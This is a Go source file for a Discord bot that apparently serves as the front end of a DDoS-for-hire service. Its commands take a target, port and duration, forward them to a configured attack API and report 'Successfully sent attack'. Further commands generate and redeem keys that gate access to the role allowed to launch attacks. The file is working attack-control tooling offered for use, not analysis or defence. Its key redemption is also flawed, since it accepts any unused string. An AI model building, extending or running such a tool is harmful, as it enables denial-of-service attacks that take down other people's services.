package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/go-resty/resty/v2"
)

type Config struct {
	BotToken      string   `json:"botToken"`
	WebhookURL    string   `json:"webhookURL"`
	AllowedRoleID string   `json:"allowedRoleId"`
	KeyRoleID     string   `json:"keyRoleId"`
	RoleToAssign  string   `json:"roleToAssign"`
	Keys          []string `json:"keys"`
	UsedKeys      map[string]bool
	Methods       map[string]Method `json:"methods"`
	API           APIConfig         `json:"api"`
}

type Method struct {
	Description string `json:"description"`
}

type APIConfig struct {
	Home APIEndpoint `json:"home"`
}

type APIEndpoint struct {
	URL           string                 `json:"url"`
	RequestFormat map[string]interface{} `json:"requestFormat"`
}

var (
	config Config
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func logToWebhook(command, username, channelID string) {
	client := resty.New()
	logMessage := fmt.Sprintf("Command: **%s**\nUser: <%s>\nChannel: <%s>", command, username, channelID)

	_, err := client.R().
		SetHeader("Content-Type", "application/json").
		SetBody(map[string]string{"content": logMessage}).
		Post(config.WebhookURL)

	if err != nil {
		log.Printf("Error logging to webhook: %v\n", err)
	}
}

func generateKey() string {
	const length = 32
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	byteKey := make([]byte, length)
	for i := range byteKey {
		byteKey[i] = charset[rand.Intn(len(charset))]
	}
	return string(byteKey)
}

func sendAPIRequest(target, port, time string) (string, error) {
	url := config.API.Home.URL
	payload := strings.NewReplacer("{TARGET}", target, "{PORT}", port, "{TIME}", time).Replace(url)

	client := &http.Client{}
	req, err := http.NewRequest("POST", payload, nil)
	if err != nil {
		return "", err
	}

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	responseBody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	// Check if the response status is a successful one
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		var errorResponse map[string]interface{}
		if err := json.Unmarshal(responseBody, &errorResponse); err == nil {
			// Check for a specific error message in the API response
			if errMsg, exists := errorResponse["error"]; exists {
				return "", fmt.Errorf("API error: %v", errMsg)
			}
		}
		return "", fmt.Errorf("received an error with status: %d, body: %s", resp.StatusCode, string(responseBody))
	}

	return string(responseBody), nil
}

func main() {
	loadConfig()

	dg, err := discordgo.New("Bot " + config.BotToken)
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	dg.AddHandler(messageHandler)

	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	log.Println("Bot is now running. Press CTRL+C to exit.")
	select {}
}

func loadConfig() {
	file, err := ioutil.ReadFile("config.json")
	if err != nil {
		log.Fatalf("Error reading config file: %v", err)
	}
	if err := json.Unmarshal(file, &config); err != nil {
		log.Fatalf("Error parsing config file: %v", err)
	}
	config.UsedKeys = make(map[string]bool)
}

func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	// Check for user's roles
	member, err := s.GuildMember(m.GuildID, m.Author.ID)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "An error occurred while checking roles.")
		return
	}

	// Check if user has the allowed role
	hasAllowedRole := false
	for _, roleID := range member.Roles {
		if roleID == config.AllowedRoleID {
			hasAllowedRole = true
			break
		}
	}

	// Handle commands
	if strings.HasPrefix(m.Content, "/methods") {
		var availableMethods []string
		for method, details := range config.Methods {
			availableMethods = append(availableMethods, fmt.Sprintf("**%s** - %s", method, details.Description))
		}
		s.ChannelMessageSend(m.ChannelID, "Available commands:\n"+strings.Join(availableMethods, "\n"))
		logToWebhook(m.Content, m.Author.Username, m.ChannelID)

	} else if strings.HasPrefix(m.Content, "/") {
		parts := strings.Fields(m.Content)

		if len(parts) < 4 {
			s.ChannelMessageSend(m.ChannelID, "Usage: `/{METHOD} {TARGET} {PORT} {TIME}`")
			return
		}

		method := strings.ToLower(parts[0][1:]) // Remove leading slash
		target := parts[1]
		port := parts[2]
		time := parts[3]

		if method != "home" {
			s.ChannelMessageSend(m.ChannelID, "Invalid method. Please use `/methods` to see available commands.")
			return
		}

		if !hasAllowedRole {
			s.ChannelMessageSend(m.ChannelID, "You do not have permission to use this command.")
			return
		}

		var (
			response string
			err      error
		)
		response, err = sendAPIRequest(target, port, time)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Error sending request: "+err.Error())
			return
		}

		// Inform the user about the successful attack
		successMessage := fmt.Sprintf("Successfully sent attack to '%s' using '%s' on '%s' for '%s'", target, method, port, time)
		s.ChannelMessageSend(m.ChannelID, successMessage)

		s.ChannelMessageSend(m.ChannelID, "Response from API: "+response)
		logToWebhook(m.Content, m.Author.Username, m.ChannelID)

	} else if strings.HasPrefix(m.Content, ".keygen") {
		// Check if the user has the role that allows key generation
		hasKeyRole := false
		for _, roleID := range member.Roles {
			if roleID == config.KeyRoleID {
				hasKeyRole = true
				break
			}
		}

		if !hasKeyRole {
			s.ChannelMessageSend(m.ChannelID, "You do not have permission to generate keys.")
			return
		}

		generatedKey := generateKey()
		config.Keys = append(config.Keys, generatedKey)
		err = saveConfig()
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Error saving generated key.")
			return
		}
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Generated key: `%s`", generatedKey))

	} else if strings.HasPrefix(m.Content, ".redeem") {
		parts := strings.Fields(m.Content)
		if len(parts) < 2 {
			s.ChannelMessageSend(m.ChannelID, "Usage: `.redeem {KEY}`")
			return
		}

		keyToRedeem := parts[1]

		// Check if the key is valid and available
		if _, used := config.UsedKeys[keyToRedeem]; used {
			s.ChannelMessageSend(m.ChannelID, "This key has already been redeemed.")
			return
		}

		// Mark the key as used
		config.UsedKeys[keyToRedeem] = true

		// Assign the specified role to the user
		err := s.GuildMemberRoleAdd(m.GuildID, m.Author.ID, config.RoleToAssign)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Failed to assign role: "+err.Error())
			return
		}

		err = saveConfig()
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "Error saving used key.")
			return
		}

		s.ChannelMessageSend(m.ChannelID, "Successfully redeemed the key and the role has been assigned!")
	}
}

func saveConfig() error {
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return err
	}
	return ioutil.WriteFile("config.json", data, 0644)
}
